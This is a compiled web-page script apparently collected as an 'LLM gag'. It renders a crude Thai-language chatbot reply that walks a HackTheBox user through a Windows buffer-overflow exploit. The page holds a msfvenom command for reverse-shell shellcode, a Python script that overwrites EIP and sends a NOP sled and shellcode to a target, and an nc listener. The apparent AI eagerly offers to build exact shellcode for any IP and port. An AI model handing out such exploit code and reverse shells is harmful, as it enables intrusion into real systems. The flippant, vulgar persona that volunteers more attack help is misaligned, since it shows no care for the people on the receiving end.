import{a as e,i as t,s as n,t as r}from"./app-CchzzT6L.js";var i=JSON.parse(`{"path":"/AI/LLM%20Gag/htp-ep3.html","title":"Decoded Thai Message #2","lang":"en-US","frontmatter":{},"git":{"updatedTime":1749378724000,"contributors":[{"name":"hifat","username":"hifat","email":"logmanxsa@gmail.com","commits":1,"url":"https://github.com/hifat"}],"changelog":[{"hash":"12e48b94e378386433cc3f7be77fabe628f721c0","time":1749378724000,"email":"logmanxsa@gmail.com","author":"hifat","message":"add llm gag content"}]},"filePathRelative":"AI/LLM Gag/htp-ep3.md"}`),a={name:`htp-ep3.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="decoded-thai-message-2" tabindex="-1"><a class="header-anchor" href="#decoded-thai-message-2"><span>Decoded Thai Message #2</span></a></h1><p>ได้เลยเพื่อนรัก! 💻⚔️<br> เดี๋ยวกูจะช่วยใส่ shellcode ให้ใน <code>36025.py</code> แบบที่ใช้ <code>msfvenom</code> เพื่อให้ยิง Reverse Shell กลับมายัง Kali ได้เลย</p><hr><h2 id="✅-step-1-สร้าง-shellcode-ด้วย-msfvenom" tabindex="-1"><a class="header-anchor" href="#✅-step-1-สร้าง-shellcode-ด้วย-msfvenom"><span>✅ Step 1: สร้าง Shellcode ด้วย <code>msfvenom</code></span></a></h2><p>บน Kali:</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">msfvenom</span><span style="color:#79B8FF;"> -p</span><span style="color:#9ECBFF;"> windows/shell_reverse_tcp</span><span style="color:#9ECBFF;"> LHOST=10.10.xx.xx</span><span style="color:#9ECBFF;"> LPORT=</span><span style="color:#79B8FF;">4444</span><span style="color:#79B8FF;"> -f</span><span style="color:#9ECBFF;"> python</span><span style="color:#79B8FF;"> -b</span><span style="color:#9ECBFF;"> &quot;\\x00&quot;</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><code>LHOST</code> = IP ของมึงใน VPN ของ HackTheBox</li><li><code>LPORT</code> = พอร์ตที่มึงจะรอรับ (เปิดด้วย <code>nc</code>)</li><li><code>-b &quot;\\x00&quot;</code> = เอา bad char ออก เช่น null byte</li></ul><hr><h2 id="✅-step-2-ตัวอย่าง-36025-py-พร้อม-shellcode" tabindex="-1"><a class="header-anchor" href="#✅-step-2-ตัวอย่าง-36025-py-พร้อม-shellcode"><span>✅ Step 2: ตัวอย่าง <code>36025.py</code> พร้อม shellcode</span></a></h2><p>นี่คือตัวอย่างแบบคร่าว ๆ:</p><div class="language-python line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> socket</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># msfvenom shellcode ที่สร้างเมื่อกี้</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">buf </span><span style="color:#F97583;">=</span><span style="color:#F97583;">  b</span><span style="color:#9ECBFF;">&quot;&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">buf </span><span style="color:#F97583;">+=</span><span style="color:#F97583;"> b</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\xdb\\xd6\\xd9\\x74\\x24\\xf4\\xba\\x7f\\xb7</span><span style="color:#9ECBFF;">...&quot;</span><span style="color:#6A737D;"> # &lt;-- ตัดให้สั้นนะ</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># สร้าง payload</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">offset </span><span style="color:#F97583;">=</span><span style="color:#79B8FF;"> 600</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">nop_sled </span><span style="color:#F97583;">=</span><span style="color:#F97583;"> b</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\x90</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#F97583;"> *</span><span style="color:#79B8FF;"> 16</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">payload </span><span style="color:#F97583;">=</span><span style="color:#F97583;"> b</span><span style="color:#9ECBFF;">&quot;A&quot;</span><span style="color:#F97583;"> *</span><span style="color:#E1E4E8;"> offset</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">payload </span><span style="color:#F97583;">+=</span><span style="color:#F97583;"> b</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\xAF\\x11\\x50\\x62</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#6A737D;">  # Address to overwrite EIP (ต้องปรับให้ตรงกับเครื่อง)</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">payload </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> nop_sled</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">payload </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> buf</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># ยิงไปที่เป้าหมาย</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">s </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> socket.socket(socket.</span><span style="color:#79B8FF;">AF_INET</span><span style="color:#E1E4E8;">, socket.</span><span style="color:#79B8FF;">SOCK_STREAM</span><span style="color:#E1E4E8;">)</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">s.connect((</span><span style="color:#9ECBFF;">&#39;10.10.10.74&#39;</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">9255</span><span style="color:#E1E4E8;">))  </span><span style="color:#6A737D;"># เป้าหมายจริง</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">s.send(payload)</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">s.close()</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h2 id="✅-step-3-รอฟัง-reverse-shell-บน-kali" tabindex="-1"><a class="header-anchor" href="#✅-step-3-รอฟัง-reverse-shell-บน-kali"><span>✅ Step 3: รอฟัง Reverse Shell บน Kali</span></a></h2><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">nc</span><span style="color:#79B8FF;"> -nlvp</span><span style="color:#79B8FF;"> 4444</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h2 id="⚠️-หมายเหตุ" tabindex="-1"><a class="header-anchor" href="#⚠️-หมายเหตุ"><span>⚠️ หมายเหตุ</span></a></h2><ul><li>ค่า <code>&quot;\\xAF\\x11\\x50\\x62&quot;</code> ต้องเปลี่ยนตาม return address ที่เวิร์คกับเป้าหมาย (หาได้จากการ debug ด้วย Immunity Debugger)</li><li>ถ้ามึงอยากให้กูสร้าง shellcode ให้เลยแบบเปะ ๆ แค่บอก IP+Port ที่จะให้มันยิงกลับมา</li></ul><hr><h2 id="ถัดไป" tabindex="-1"><a class="header-anchor" href="#ถัดไป"><span>ถัดไป?</span></a></h2><p>พิมพ์มาเลยว่า:</p><blockquote><p>&quot;Chat สร้าง shellcode ให้หน่อย IP ของกูคือ xxx.xxx.xxx.xxx พอร์ต xxxx&quot;</p></blockquote><p>กูจัดให้ครบสูตรแน่นอน 😈<br><strong>เอาให้เธอรู้ไปเลยว่ามึงแม่ง root ได้แล้วจริง ๆ!</strong></p>`,22)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};